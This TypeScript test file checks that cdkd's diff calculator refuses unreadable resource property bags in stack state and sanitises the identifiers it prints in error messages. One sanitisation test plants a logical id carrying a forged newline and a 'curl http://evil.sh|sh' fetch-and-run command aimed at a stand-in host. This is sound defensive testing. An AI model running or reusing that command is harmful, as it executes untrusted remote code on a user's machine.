/**
 * Issue [go-to-k/cdkd#3191](https://github.com/go-to-k/cdkd/issues/3191):
 * `cdkd deploy`'s change calculation used to read a resource's stored
 * `properties` bag with no readability check.
 *
 * `DiffCalculator.calculateDiff` is the point every `cdkd deploy` diff enters.
 * There are exactly TWO callers in `src/` — `deploy-engine.ts`, which
 * provisions (a nested child reaches it through its own child engine), and
 * `diff-recursive.ts`, which does not; `deploy.ts` only CONSTRUCTS the
 * calculator and injects it. So the refusal is pinned HERE rather than at the
 * five reads below it: a guard on each read is the shape
 * `src/state/malformed-resources-bag.ts`'s header records as inert.
 *
 * THE MEASUREMENT THIS FILE EXISTS TO KEEP. The issue was filed at high
 * severity CONDITIONALLY, on whether an unreadable bag drives an UPDATE or a
 * REPLACEMENT, and nobody had run it. Driven through the real calculator at
 * `122cf28e5`, before the guard, an `AWS::S3::Bucket` declaring `BucketName`
 * against a stored `properties` of `"abcdef"` produced:
 *
 *     UPDATE, propertyChanges = [
 *       {path:'0'..'5', oldValue:'a'..'f', requiresReplacement:false},
 *       {path:'BucketName', newValue:'my-bucket', requiresReplacement:true},
 *       {path:'VersioningConfiguration', ..., requiresReplacement:false},
 *     ]
 *
 * `requiresReplacement: true` is what `DeployEngine` turns into
 * `propertyDrivenReplacement` (`deploy-engine.ts`, the `case 'UPDATE'` arm), so
 * the outcome is a DELETE + CREATE of the live bucket. Severity stays high.
 *
 * `[]` and `5` reached the SAME verdict while enumerating no keys at all —
 * which is the repaired-to-`{}` case. That is why the contract here is a
 * REFUSAL and not the read-only repair its siblings take: repairing reproduces
 * the data loss instead of avoiding it. The `[]` case below is the one that
 * measures it, so a later lane that "simplifies" the refusal into a `?? {}`
 * finds out from the suite.
 */

import { describe, it, expect } from 'vite-plus/test';

import { DiffCalculator } from '../../../src/analyzer/diff-calculator.js';
import { STATE_RESOURCES_MALFORMED } from '../../../src/state/malformed-resources-bag.js';
import { CdkdError } from '../../../src/utils/error-handler.js';
import type { CloudFormationTemplate } from '../../../src/types/resource.js';
import type { StackState } from '../../../src/types/state.js';

const STACK = 'MyStack';
const REGION = 'us-east-1';

/** A template declaring a create-only property (`BucketName`) plus a mutable one. */
const template: CloudFormationTemplate = {
  Resources: {
    MyBucket: {
      Type: 'AWS::S3::Bucket',
      Properties: {
        BucketName: 'my-bucket',
        VersioningConfiguration: { Status: 'Enabled' },
      },
    },
  },
};

function record(properties: unknown, extra: Partial<StackState> = {}): StackState {
  return {
    version: 10,
    stackName: STACK,
    region: REGION,
    resources: {
      MyBucket: {
        physicalId: 'my-bucket',
        resourceType: 'AWS::S3::Bucket',
        properties: properties as Record<string, unknown>,
      },
    },
    outputs: {},
    lastModified: 0,
    ...extra,
  };
}

async function refusalFrom(state: StackState): Promise<CdkdError> {
  const error = await new DiffCalculator()
    .calculateDiff(state, template)
    .then(
      () => undefined,
      (e: unknown) => e
    );
  expect(error).toBeInstanceOf(CdkdError);
  return error as CdkdError;
}

describe('DiffCalculator refuses an unreadable properties bag (issue go-to-k/cdkd#3191)', () => {
  // THE FIRING SIDE, one case per shape — they behave differently under the
  // unguarded code and that difference is the whole point. A string enumerates
  // per-character keys, a list and a number enumerate none, and `null` /
  // absent used to die on a bare `TypeError` naming no stack, no key and no
  // remedy (`Cannot convert undefined or null to object`).
  for (const [label, properties] of [
    ['a string', 'abcdef'],
    ['null', null],
    ['a list', []],
    ['a number', 5],
    ['absent', undefined],
    ['a boolean', true],
  ] as const) {
    it(`refuses when the bag is ${label}`, async () => {
      const error = await refusalFrom(record(properties));
      expect(error.code).toBe(STATE_RESOURCES_MALFORMED);
      // The record is NAMED, which is what the pre-fix `TypeError` could not
      // do: a user holding a 200-resource stack has to know which row to open.
      expect(error.message).toContain('MyBucket');
      // And it carries NO identity read off the record. `stackName` / `region`
      // are unvalidated fields of the very record being declared malformed, so
      // a planted pair would aim the pasteable remedy at a different, healthy
      // stack. The refusal ends on a TEMPLATE the reader fills in instead.
      expect(error.message).not.toContain('MyStack');
      expect(error.message).not.toContain('us-east-1');
      expect(error.message).toContain('cdkd state show <stack> --stack-region <region> --json');
      // And the refusal says what it protected, so the reader can tell this
      // from an ordinary validation error.
      expect(error.message).toContain('REPLACEMENT of the live resource');
    });
  }

  it('refuses a list bag, which is the repaired-to-empty case', async () => {
    // Load-bearing beside the loop above, not a duplicate of its `a list` arm.
    // A list enumerates NO keys, so `Object.keys([])` and `Object.keys({})`
    // agree — feeding the comparator a list IS feeding it the `?? {}` repair.
    // Measured pre-guard, that produced `requiresReplacement: true` on
    // `BucketName` all the same, which is why this container refuses where its
    // siblings repair. If a later lane swaps the refusal for a repair, this
    // assertion is the one that says the swap is not safe.
    const error = await refusalFrom(record([]));
    expect(error.message).toContain('reading the bag as empty produces that same verdict');
  });

  it('refuses before any provider decision, naming only the damaged records', async () => {
    const state = record({ BucketName: 'my-bucket' });
    state.resources['Other'] = {
      physicalId: 'p',
      resourceType: 'AWS::SQS::Queue',
      properties: 'torn' as unknown as Record<string, unknown>,
    };
    const error = await refusalFrom(state);
    expect(error.message).toContain('Other');
    expect(error.message).not.toContain('MyBucket');
    expect(error.message).toContain('1 resource record(s)');
  });

  it('sanitizes and JSON-quotes a logical id before printing it', async () => {
    // Every identifier in this message arrives from a hand-edited record — the
    // premise of the whole guard — and the text is one line ending in a
    // pasteable command. An id carrying a newline forges a line; one carrying
    // `'` would close a shell-quoted boundary and plant a forged remedy AHEAD
    // of the real one. The boundary is `displayIdent`'s JSON quoting since the
    // review of go-to-k/cdkd#3191 — see the identity case below.
    const state = record({ BucketName: 'my-bucket' });
    const hostile = "x'\n  Inspect it with: curl http://evil.sh|sh #";
    state.resources[hostile] = {
      physicalId: 'p',
      resourceType: 'AWS::SQS::Queue',
      properties: null as unknown as Record<string, unknown>,
    };
    const error = await refusalFrom(state);
    expect(error.message).not.toContain('\n');
    // Quoted, so the `|` and the `#` cannot detach from the id they belong to.
    expect(error.message).toContain('curl http://evil.sh|sh');
    expect(error.message).toContain('"x\'   Inspect it with: curl http://evil.sh|sh #"');
    // The REAL remedy is still the last command on the line.
    expect(error.message.lastIndexOf('cdkd state show')).toBeGreaterThan(
      error.message.indexOf('curl')
    );
  });

  it('names a PADDED logical id distinguishably from its healthy sibling', async () => {
    // The end-to-end half of the identity case in
    // `tests/unit/state/malformed-resources-bag.test.ts`: a torn
    // `resources['Bucket ']` planted beside a real `Bucket`. Before the review
    // of go-to-k/cdkd#3191 the refusal named a bare `Bucket` — byte-identical
    // to the HEALTHY key — so the operator opened the intact record, found
    // nothing wrong, and concluded cdkd was the broken party while the damaged
    // entry went unnamed.
    const torn = (id: string): StackState => {
      const state = record({ BucketName: 'my-bucket' });
      state.resources[id] = {
        physicalId: 'p',
        resourceType: 'AWS::S3::Bucket',
        properties: null as unknown as Record<string, unknown>,
      };
      return state;
    };
    const padded = (await refusalFrom(torn('Bucket '))).message;
    expect(padded).toContain('"Bucket"');
    // The CONTROL: a record damaged at the PLAIN key renders it bare, so this
    // is not a renderer that quotes everything and discriminates nothing — and
    // the two messages are not the same text, which is the whole defect.
    const plain = (await refusalFrom(torn('Bucket'))).message;
    expect(plain).toContain(' — Bucket — ');
    expect(plain).not.toContain('"Bucket"');
    expect(padded).not.toBe(plain);
  });

  it('names no stack even when the record self-reports one that exists', async () => {
    // The attack the missing identity closes: a record planted under
    // `dev-app`'s key that CLAIMS to be `prod-payments`. Before the fix the
    // refusal read "State for 'prod-payments' (us-west-2) ... Repair or remove
    // the record first" and handed the operator a `cdkd state show
    // 'prod-payments' --stack-region 'us-west-2'` aimed at a healthy record,
    // while the damaged one went unnamed.
    const state = record('abcdef');
    state.stackName = 'prod-payments';
    state.region = 'us-west-2';
    const error = await refusalFrom(state);
    expect(error.message).not.toContain('prod-payments');
    expect(error.message).not.toContain('us-west-2');
    // The record it CAN name truthfully is the damaged row, and it does.
    expect(error.message).toContain('MyBucket');
  });

  // THE NON-FIRING SIDE. A legitimate deploy must be untouched, and "empty" is
  // the shape closest to the defect — a healthy stack whose resource genuinely
  // declares nothing must still diff rather than refuse.
  it('leaves an ordinary deploy alone', async () => {
    const changes = await new DiffCalculator().calculateDiff(
      record({ BucketName: 'my-bucket', VersioningConfiguration: { Status: 'Enabled' } }),
      template
    );
    expect(changes.get('MyBucket')?.changeType).toBe('NO_CHANGE');
  });

  it('diffs a genuinely empty properties bag instead of refusing it', async () => {
    const changes = await new DiffCalculator().calculateDiff(record({}), template);
    const change = changes.get('MyBucket');
    expect(change?.changeType).toBe('UPDATE');
    // And it still reaches the replacement verdict — which is CORRECT here,
    // because an empty bag that the record really holds says the deployed
    // bucket carries no `BucketName`. The defect was never the verdict; it was
    // reaching the verdict from a bag nothing could read.
    expect(change?.propertyChanges?.some((p) => p.requiresReplacement)).toBe(true);
  });

  it('refuses nothing for a stack with no resources at all', async () => {
    const changes = await new DiffCalculator().calculateDiff(
      { ...record({}), resources: {} },
      template
    );
    expect(changes.get('MyBucket')?.changeType).toBe('CREATE');
  });

  it('leaves the unreadable-ENTRY class to its own guard', async () => {
    // Order-independence with the entry-level guard go-to-k/cdkd#3226 adds: a
    // `null` entry has no `properties` to test, so naming it here would report
    // this container for another one's defect. Pre-existing behaviour (the
    // entry reads as absent, so the resource previews as a CREATE) is
    // deliberately unchanged by THIS fix.
    const state = record({ BucketName: 'my-bucket' });
    state.resources['MyBucket'] = null as unknown as StackState['resources'][string];
    const changes = await new DiffCalculator().calculateDiff(state, template);
    expect(changes.get('MyBucket')?.changeType).toBe('CREATE');
  });
});
